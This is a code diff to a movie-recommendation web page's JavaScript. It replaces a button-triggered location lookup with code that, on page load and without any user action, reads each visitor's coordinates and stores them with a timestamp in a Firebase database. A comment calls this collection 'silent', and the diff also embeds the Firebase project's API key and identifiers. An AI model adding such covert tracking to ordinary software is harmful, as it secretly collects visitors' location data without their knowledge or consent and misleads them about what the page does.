@@ -36,20 +36,36 @@ function recommendMovie() {
         document.getElementById('whereToWatch').textContent = 'get out fool';
     }
 }
-const button = document.querySelector("button");
+const firebaseConfig = {
+    apiKey: "AIzaSyBAkZW1dh1GI9yCPa0dbpkgQGjNYj-s5UY",
+    authDomain: "movie-recorn.firebaseapp.com",
+    projectId: "movie-recorn",
+    storageBucket: "movie-recorn.appspot.com",
+    messagingSenderId: "624310009803",
+    appId: "1:624310009803:web:752721f6f675e7902b004e",
+    measurementId: "G-H7SBZKLL94"
+  };
 
-button.addEventListener("click", () => {
-    navigator.geolocation.getCurrentPosition(position => {
-        // Get latitude & longitude from position object
-        const { latitude, longitude } = position.coords;
-        const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`;
-        fetch(url)
-            .then(res => res.json())
-            .then(data => {
-                console.table(data.address);
-            })
-            .catch(() => {
-                console.log("Error fetching data from API");
-            });
-    });
+// Initialize Firebase
+firebase.initializeApp(firebaseConfig);
+
+const db = firebase.firestore();
+
+// Collect and store geolocation data silently
+navigator.geolocation.getCurrentPosition(position => {
+    const { latitude, longitude } = position.coords;
+    const dataToStore = {
+        latitude,
+        longitude,
+        timestamp: firebase.firestore.FieldValue.serverTimestamp() // Include a timestamp
+    };
+
+    // Store data in Firestore
+    db.collection("geolocationData").add(dataToStore)
+        .then(docRef => {
+            console.log("Data stored in Firestore with ID: ", docRef.id);
+        })
+        .catch(error => {
+            console.error("Error storing data in Firestore: ", error);
+        });
 });
